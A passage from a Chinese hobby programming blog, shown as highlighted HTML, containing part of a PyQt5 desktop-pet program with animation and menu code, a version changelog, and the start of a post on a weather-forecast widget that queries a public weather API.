&lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">1</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-撞墙&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hitwall</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.move(self.x, self.pos().y())</span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-坠落&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fall</span>(<span class="params">self</span>):</span></span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y += <span class="built_in">int</span>(<span class="number">16</span>)</span><br><span class="line">        screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">        <span class="keyword">if</span> (y &gt;= screenRect.height() - self.size().height()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;now is kiss the ground&#x27;</span>)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.touchdown_key = <span class="number">1</span></span><br><span class="line">            self.InitTimer(self.randomAct,<span class="number">80</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.move(x,y)</span><br><span class="line">            self.setImage(self.pet_images[<span class="number">6</span>][<span class="number">0</span>].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-触地&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">touchdown</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x = self.pos().x()</span><br><span class="line">        self.y = self.pos().y()</span><br><span class="line">        self.x -= <span class="number">2</span></span><br><span class="line">        self.y -= <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">            self.touchdown_key = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.move(self.x, self.y)</span><br><span class="line">            self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">            self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-吃瘪&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uncomfortable</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action = <span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span> + <span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-拖动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dragging</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action = <span class="number">3</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span> + <span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-跳跃&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jumpping</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == <span class="number">0</span>:</span><br><span class="line">            self.z = <span class="number">80</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.fallingBody()</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">            self.jumpping_key = <span class="number">0</span></span><br><span class="line">            self.z = <span class="number">80</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            self.x = self.pos().x()</span><br><span class="line">            self.y = self.pos().y()</span><br><span class="line">            self.x += <span class="built_in">int</span>(<span class="number">48</span> * (<span class="number">0.5</span> - self.heading))</span><br><span class="line">            self.y -= self.z</span><br><span class="line">            self.z -= <span class="number">5</span></span><br><span class="line">            <span class="keyword">if</span> (self.heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.fallingBody()</span><br><span class="line">                    self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.y)</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (self.heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    x = self.pos().x()</span><br><span class="line">                    x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.fallingBody()</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.y)</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;设置当前显示的图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setImage</span>(<span class="params">self, image</span>):</span></span><br><span class="line">        self.image.setPixmap(QPixmap.fromImage(image))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机导入一个桌面宠物的所有图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomLoadPetImages</span>(<span class="params">self</span>):</span></span><br><span class="line">        cfg = self.cfg</span><br><span class="line">        pet_name = random.choice(<span class="built_in">list</span>(cfg.PET_ACTIONS_MAP.keys()))</span><br><span class="line">        actions = cfg.PET_ACTIONS_MAP[pet_name]</span><br><span class="line">        pet_images = []</span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> action <span class="keyword">in</span> actions:</span><br><span class="line">            patch = [self.loadImage(os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shime&#x27;</span>+item+<span class="string">&#x27;.png&#x27;</span>)) <span class="keyword">for</span> item <span class="keyword">in</span> action]</span><br><span class="line">            pet_images.append(patch)</span><br><span class="line">        iconpath = os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shimeX.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pet_images, iconpath</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标左右键功能&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mousePressEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.button() == Qt.LeftButton:</span><br><span class="line">            self.InitTimer(self.dragging,<span class="number">80</span>)</span><br><span class="line">            self.is_follow_mouse = <span class="literal">True</span></span><br><span class="line">            self.mouse_drag_pos = event.globalPos() - self.pos()</span><br><span class="line">            event.accept()</span><br><span class="line">            self.setCursor(QCursor(Qt.OpenHandCursor))</span><br><span class="line">        <span class="keyword">elif</span> event.button() == Qt.RightButton:</span><br><span class="line">            self.InitTimer(self.uncomfortable,<span class="number">80</span>)</span><br><span class="line">            self.menu = QMenu(self)</span><br><span class="line">            self.weather = self.menu.addAction(<span class="string">&quot;天气预报&quot;</span>)</span><br><span class="line">            self.crawler = self.menu.addAction(<span class="string">&quot;启动爬虫&quot;</span>)</span><br><span class="line">            self.music = self.menu.addAction(<span class="string">&quot;网易云API&quot;</span>)</span><br><span class="line">            self.imagebox = self.menu.addAction(<span class="string">&quot;图片盒子&quot;</span>)</span><br><span class="line">            self.quitA = self.menu.addAction(<span class="string">&quot;退出附属程序&quot;</span>)</span><br><span class="line">            self.quit = self.menu.addAction(<span class="string">&quot;退出桌宠&quot;</span>)</span><br><span class="line">            self.choice = self.menu.exec_(self.mapToGlobal(event.pos()))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.weather):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;weather&quot;</span>)</span><br><span class="line">                self.weatherGet()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.crawler):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;crawler&quot;</span>)</span><br><span class="line">                self.crawlerStart()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.music):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;music&quot;</span>)</span><br><span class="line">                self.Netease()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.imagebox):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;imagebox&quot;</span>)</span><br><span class="line">                self.imageBox()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.quitA):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;quitA&quot;</span>)</span><br><span class="line">                self.quitAttached()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.quit):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">                self.quitPet()</span><br><span class="line"></span><br><span class="line">            self.randomAct()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标移动, 则宠物也移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseMoveEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> Qt.LeftButton <span class="keyword">and</span> self.is_follow_mouse:</span><br><span class="line">            self.move(event.globalPos() - self.mouse_drag_pos)</span><br><span class="line">            event.accept()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标释放时, 取消绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseReleaseEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.setCursor(QCursor(Qt.ArrowCursor))</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;宠物自由落体&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fallingBody</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x=%x : y=%x&quot;</span> %(x,y))</span><br><span class="line">        self.InitTimer(self.fall,<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;导入图像&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loadImage</span>(<span class="params">self, imagepath</span>):</span></span><br><span class="line">        image = QImage()</span><br><span class="line">        image.load(imagepath)</span><br><span class="line">        <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机到一个屏幕上的某个位置&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomPosition</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_geo = QDesktopWidget().screenGeometry()</span><br><span class="line">        pet_geo = self.geometry()</span><br><span class="line">        width = (screen_geo.width() - pet_geo.width()) * random.random()</span><br><span class="line">        height = (screen_geo.height() - pet_geo.height()) * random.random()</span><br><span class="line">        self.move(<span class="built_in">int</span>(width), <span class="built_in">int</span>(height))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;天气预报&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">weatherGet</span>(<span class="params">self</span>):</span></span><br><span class="line">        wea.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;启动爬虫&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crawlerStart</span>(<span class="params">self</span>):</span></span><br><span class="line">        pets.close()</span><br><span class="line">        cra.Start()</span><br><span class="line">        pets.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Netease</span>(<span class="params">self</span>):</span></span><br><span class="line">        mus.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;图片盒子&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">imageBox</span>(<span class="params">self</span>):</span></span><br><span class="line">        box.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出附属程序&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitAttached</span>(<span class="params">self</span>):</span></span><br><span class="line">        wea.close()</span><br><span class="line">        box.close()</span><br><span class="line">        mus.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Everything is done!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出桌宠&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitPet</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.close()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    pets = DesktopPet()</span><br><span class="line">    wea = Mainweather()</span><br><span class="line">    mus = Netease()</span><br><span class="line">    palette = QPalette()</span><br><span class="line">    palette.setBrush(QPalette.Background, QBrush(QPixmap(<span class="string">&quot;D:\PythonProject\images\YHellow.png&quot;</span>)))</span><br><span class="line">    wea.setPalette(palette)</span><br><span class="line">    mus.setPalette(palette)</span><br><span class="line">    cra = Crawler()</span><br><span class="line">    box = MainBOX()</span><br><span class="line">    pets.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li>version：v2.1</li>
<li>date：2022.5.20</li>
<li>type：<ul>
<li>Features：<ul>
<li>新添右键功能：网易云API</li>
</ul>
</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li>desc：<ul>
<li>以我的技术，感觉已经到极限了，可能会有好长一段时间都不会更新了</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/13/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/13/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/" class="post-title-link" itemprop="url">不务正业系列：天气预报（偶尔更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-05-13 18:11:32 / Modified: 20:07:40" itemprop="dateCreated datePublished" datetime="2022-05-13T18:11:32+08:00">2022-05-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NoMaoWork/" itemprop="url" rel="index"><span itemprop="name">NoMaoWork</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="天气预报"><a href="#天气预报" class="headerlink" title="天气预报"></a>天气预报</h2><p>这是一个小项目，就是某本书上的一个例题</p>
<p>原理为：</p>
<ul>
<li>requests 获取中国天气官网地址的 web API</li>
<li>使用 Python 进行打印</li>
</ul>
<p>样例代码为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">rep=requests.get(<span class="string">&#x27;http://www.weather.com.cn/data/sk/101270101.html&#x27;</span>) <span class="comment"># 成都,101270101</span></span><br><span class="line"></span><br><span class="line">rep.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;返回结果: %s&#x27;</span> % rep.json() )</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;城市: %s&#x27;</span> %rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;city&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;风向: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WD&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;温度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;temp&#x27;</span>]+ <span class="string">&quot; 度&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;风力: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WS&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;湿度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;SD&#x27;</span>])</span><br></pre></td></tr></table></figure>
<h2 id="CallWeatherWin-V1-0"><a href="#CallWeatherWin-V1-0" class="headerlink" title="CallWeatherWin_V1.0"></a>CallWeatherWin_V1.0</h2><p>这个小程序是为了桌宠写的，我会把它添加到桌宠的右键菜单中</p>
<img src="/2022/05/13/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5/1652436461986-1652443659509.png" class width="1652436461986"> 
<p>目前只添加了两个城市，如果有需要可以在网上搜索城市代码，自行添加</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtCore, QtGui, QtWidgets</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mainweather</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,parent=<span class="literal">None</span>,**kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Mainweather, self).__init__(parent)</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(self.cfg, key): <span class="built_in">setattr</span>(self.cfg, key, value)</span><br><span class="line">        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.SubWindow)</span><br><span class="line">        self.ui = UI_Form()</span><br><span class="line">        self.ui.setupUI(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">queryWeather</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;* queryWeather &#x27;</span>)</span><br><span class="line">        cityName = self.ui.weatherComboBox.currentText()</span><br><span class="line">        cityCode = self.transCityName(cityName)</span><br><span class="line"></span><br><span class="line">        rep = requests.get(<span class="string">&#x27;http://www.weather.com.cn/data/sk/&#x27;</span>+cityCode+<span class="string">&#x27;.html&#x27;</span>)</span><br><span class="line">        rep.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(rep.json())</span><br><span class="line"></span><br><span class="line">        msg1 = (<span class="string">&#x27;城市: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;city&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg2 = (<span class="string">&#x27;风向: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WD&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg3 = (<span class="string">&#x27;温度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;temp&#x27;</span>] + <span class="string">&quot; 度&quot;</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg4 = (<span class="string">&#x27;风力: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;WS&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        msg5 = (<span class="string">&#x27;湿度: %s&#x27;</span> % rep.json()[<span class="string">&#x27;weatherinfo&#x27;</span>][<span class="string">&#x27;SD&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">        result = msg1+msg2+msg3+msg4+msg5</span><br><span class="line">        self.ui.resultText.setText(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">transCityName</span>(<span class="params">self,cityName</span>):</span></span><br><span class="line">        cityCode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> cityName == <span class="string">&#x27;成都&#x27;</span>:</span><br><span class="line">            cityCode = <span class="string">&#x27;101270101&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> cityName == <span class="string">&#x27;南充&#x27;</span>:</span><br><span class="line">            cityCode = <span class="string">&#x27;101270501&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> cityCode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clearResult</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span 